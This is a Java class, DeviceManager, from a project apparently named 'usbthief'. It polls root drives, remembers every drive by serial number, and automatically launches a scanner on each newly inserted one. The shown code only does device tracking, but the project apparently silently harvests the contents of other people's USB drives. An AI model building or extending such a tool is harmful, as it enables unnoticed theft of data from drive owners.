package com.superredrock.usbthief.core;

import com.superredrock.usbthief.core.config.ConfigManager;
import com.superredrock.usbthief.core.event.EventBus;
import com.superredrock.usbthief.core.event.device.DeviceInsertedEvent;
import com.superredrock.usbthief.core.event.device.DeviceRemovedEvent;
import com.superredrock.usbthief.core.event.device.DeviceStateChangedEvent;
import com.superredrock.usbthief.core.event.device.NewDeviceJoinedEvent;
import com.superredrock.usbthief.worker.DeviceScanner;

import java.nio.file.*;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.function.Predicate;
import java.util.logging.Logger;
import java.util.prefs.Preferences;
import java.util.stream.Collectors;

public class DeviceManager extends Service {

    private static final String PREF_KEY_DEVICE_RECORDS = "deviceRecords";
    private static final String RECORD_DELIMITER = "||";

    private final Set<Device> devices = Collections.synchronizedSet(new HashSet<>());
    private final Map<Device, DeviceScanner> activeScanners = new ConcurrentHashMap<>();
    private final Set<DeviceRecord> deviceRecords = ConcurrentHashMap.newKeySet();
    private final FileSystem fileSystem = FileSystems.getDefault();
    private final EventBus eventBus;
    private final Preferences prefs = Preferences.userNodeForPackage(DeviceManager.class);

    protected static final Logger logger = Logger.getLogger(DeviceManager.class.getName());

    public DeviceManager() {
        this(EventBus.getInstance());
    }

    protected DeviceManager(EventBus eventBus) {
        this.eventBus = eventBus;
        loadDeviceRecords();
        createGhostDevices();
        initializeExistingDevices();
    }

    @Override
    protected void tick() {
        logger.fine("DeviceManager tick");
        if (!checkInterrupt()) {
            detectNewDevices();
        }
        if (!checkInterrupt()) {
            updateAllDevices();
        }
    }

    @Override
    protected long getTickIntervalMs() {
        return 2000;
    }

    @Override
    public String getServiceName() {
        return "DeviceManager";
    }

    @Override
    public String getDescription() {
        return "Device detection and monitoring service";
    }

    @Override
    protected void cleanup() {
        stopAllScanners();
        devices.clear();
        activeScanners.clear();
    }

    @Override
    public String getStatus() {
        return String.format("DeviceManager[%s] - Devices: %d, Scanners: %d", 
                state, devices.size(), activeScanners.size());
    }

    // ==================== Device Detection ====================

    private void detectNewDevices() {
        for (Path path : fileSystem.getRootDirectories()) {
            if (checkInterrupt()) {
                break;
            }

            String serial = getHardDiskSN(path.toString());

            if (ConfigManager.getInstance().isDeviceBlacklistedBySerial(serial)) {
                logger.fine("Device blacklisted by serial number, ignoring: " + serial + " (" + path + ")");
                continue;
            }

            Device existing = findDeviceBySerial(serial);

            if (existing != null) {
                if (existing.isGhost()) {
                    mergeGhostToDevice(existing, path);
                }
            } else {
                Device device = new Device(path);
                devices.add(device);
                addDeviceRecord(device);
                onNewDeviceJoined(device);
            }
        }
    }

    private void updateAllDevices() {
        synchronized (devices) {
            for (Device device : devices) {
                if (checkInterrupt()) {
                    break;
                }

                Device.DeviceState previousState = device.getState();
                device.updateState();

                if (device.isChangeAndReset()) {
                    Device.DeviceState newState = device.getState();
                    onDeviceStateChanged(device, previousState, newState);

                    if (newState == Device.DeviceState.OFFLINE && !device.isGhost()) {
                        convertToGhost(device);
                        onDeviceRemoved(device);
                    }
                }

                manageScanner(device);
            }
        }
    }

    // ==================== Scanner Management ====================

    private void manageScanner(Device device) {
        if (device.isGhost()) {
            return;
        }

        switch (device.getState()) {
            case IDLE -> {
                if (!isScannerRunning(device)) {
                    startScanner(device);
                    device.setState(Device.DeviceState.SCANNING);
                }
            }
            case SCANNING -> {
                if (isScannerRunning(device) && !isScannerAlive(device)) {
                    stopScanner(device);
                    device.setState(Device.DeviceState.IDLE);
                }
            }
            case DISABLED -> {
                if (isScannerRunning(device)) {
                    stopScanner(device);
                }
            }
            default -> {}
        }
    }

    private void startScanner(Device device) {
        if (device.isGhost() || device.getFileStore() == null) {
            return;
        }
        
        DeviceScanner scanner = new DeviceScanner(device, device.getFileStore());
        activeScanners.put(device, scanner);
        scanner.start();
        logger.fine("Started scanner for device: " + device.getSerialNumber());
    }

    private void stopScanner(Device device) {
        DeviceScanner scanner = activeScanners.remove(device);
        if (scanner != null) {
            scanner.interrupt();
            scanner.stopMonitoring();
            logger.fine("Stopped scanner for device: " + device.getSerialNumber());
        }
    }

    private void stopAllScanners() {
        for (Device device : new HashSet<>(activeScanners.keySet())) {
            stopScanner(device);
        }
    }

    private boolean isScannerRunning(Device device) {
        return activeScanners.containsKey(device);
    }

    private boolean isScannerAlive(Device device) {
        DeviceScanner scanner = activeScanners.get(device);
        return scanner != null && scanner.isAlive();
    }

    // ==================== Ghost Device Management ====================

    private void convertToGhost(Device device) {
        stopScanner(device);

        DeviceRecord record = device.toRecord();
        Device ghost = new Device(record);

        devices.remove(device);
        devices.add(ghost);

        logger.fine("Device converted to ghost: " + device.getSerialNumber());
    }

    private void mergeGhostToDevice(Device ghost, Path rootPath) {
        Device realDevice = new Device(rootPath);

        devices.remove(ghost);
        devices.add(realDevice);

        updateDeviceRecord(realDevice);

        onDeviceInserted(realDevice);
        logger.fine("Ghost device merged to real: " + realDevice.getSerialNumber());
    }

    // ==================== Device Record Persistence ====================

    private void loadDeviceRecords() {
        String stored = prefs.get(PREF_KEY_DEVICE_RECORDS, "");
        if (!stored.isEmpty()) {
            String[] records = stored.split("\\|\\|");
            for (String record : records) {
                try {
                    deviceRecords.add(DeviceRecord.fromString(record));
                } catch (IllegalArgumentException e) {
                    logger.warning("Invalid device record: " + record);
                }
            }
        }
        logger.info("Loaded " + deviceRecords.size() + " device records");
    }

    private void saveDeviceRecords() {
        String stored = deviceRecords.stream()
                .map(DeviceRecord::toString)
                .collect(Collectors.joining(RECORD_DELIMITER));
        prefs.put(PREF_KEY_DEVICE_RECORDS, stored);
    }

    private void addDeviceRecord(Device device) {
        DeviceRecord record = device.toRecord();
        if (deviceRecords.add(record)) {
            saveDeviceRecords();
        }
    }

    private void updateDeviceRecord(Device device) {
        DeviceRecord record = device.toRecord();
        deviceRecords.removeIf(r -> r.serialNumber().equals(record.serialNumber()));
        deviceRecords.add(record);
        saveDeviceRecords();
    }

    public void clearDeviceRecords() {
        prefs.remove(PREF_KEY_DEVICE_RECORDS);
        deviceRecords.clear();
        logger.info("Cleared all device records");
    }

    private void createGhostDevices() {
        for (DeviceRecord record : deviceRecords) {
            Device ghost = new Device(record);
            devices.add(ghost);
        }
    }

    // ==================== Device Initialization ====================

    private void initializeExistingDevices() {
        for (Path path : fileSystem.getRootDirectories()) {
            String serial = getHardDiskSN(path.toString());

            if (ConfigManager.getInstance().isDeviceBlacklistedBySerial(serial)) {
                continue;
            }

            Device ghostDevice = findGhostDevice(serial);

            if (ghostDevice != null) {
                mergeGhostToDevice(ghostDevice, path);
            } else {
                Device device = new Device(path);
                DeviceRecord record = device.toRecord();
                if (!deviceRecords.contains(record)) {
                    addDeviceRecord(device);
                    onNewDeviceJoined(device);
                }
                devices.add(device);
            }
        }
    }

    // ==================== Device Lookup ====================

    private Device findDevice(Predicate<Device> predicate) {
        synchronized (devices) {
            for (Device device : devices) {
                if (predicate.test(device)) {
                    return device;
                }
            }
        }
        return null;
    }

    private Device findGhostDevice(String serial) {
        return findDevice(device -> device.isGhost() && serial.equals(device.getSerialNumber()));
    }

    private Device findDeviceBySerial(String serial) {
        return findDevice(device -> serial.equals(device.getSerialNumber()));
    }

    public Device getDevice(Path path) {
        return findDevice(device -> !device.isGhost() && path.startsWith(device.getRootPath()));
    }

    public Device getDevice(FileStore store) {
        if (store == null) {
            return null;
        }
        return findDevice(device -> {
            FileStore deviceStore = device.getFileStore();
            return store.equals(deviceStore) && device.getState() != Device.DeviceState.OFFLINE;
        });
    }

    public Set<Device> getAllDevices() {
        synchronized (devices) {
            return Set.copyOf(devices);
        }
    }

    // ==================== Public Control Methods ====================

    public void enableDevice(Device device) {
        device.enable();
    }

    public void disableDevice(Device device) {
        device.disable();
        stopScanner(device);
    }

    public void updateDeviceVolumeName(String serial, String volumeName) {
        if (serial == null || serial.isEmpty()) {
            return;
        }
        
        DeviceRecord existingRecord = deviceRecords.stream()
                .filter(r -> r.serialNumber().equals(serial))
                .findFirst()
                .orElse(null);
        
        if (existingRecord != null && volumeName != null && !volumeName.trim().isEmpty()) {
            deviceRecords.remove(existingRecord);
            deviceRecords.add(new DeviceRecord(serial, volumeName.trim()));
            saveDeviceRecords();
        }
    }

    // ==================== Helper Methods ====================

    private boolean checkInterrupt() {
        return Thread.currentThread().isInterrupted();
    }

    private static String getHardDiskSN(String path) {
        return DeviceUtils.getHardDiskSN(path);
    }

    // ==================== Event Dispatching ====================

    protected void onDeviceInserted(Device device) {
        logger.info("Device inserted: " + device);
        eventBus.dispatch(new DeviceInsertedEvent(device));
    }

    protected void onDeviceRemoved(Device device) {
        logger.info("Device removed: " + device);
        eventBus.dispatch(new DeviceRemovedEvent(device));
    }

    protected void onDeviceStateChanged(Device device, Device.DeviceState oldState, Device.DeviceState newState) {
        logger.fine(String.format("Device state changed: %s %s -> %s", device, oldState, newState));
        eventBus.dispatch(new DeviceStateChangedEvent(device, oldState, newState));
    }

    protected void onNewDeviceJoined(Device device) {
        logger.info("New device joined (first time): " + device.getSerialNumber());
        eventBus.dispatch(new NewDeviceJoinedEvent(device));
    }
}
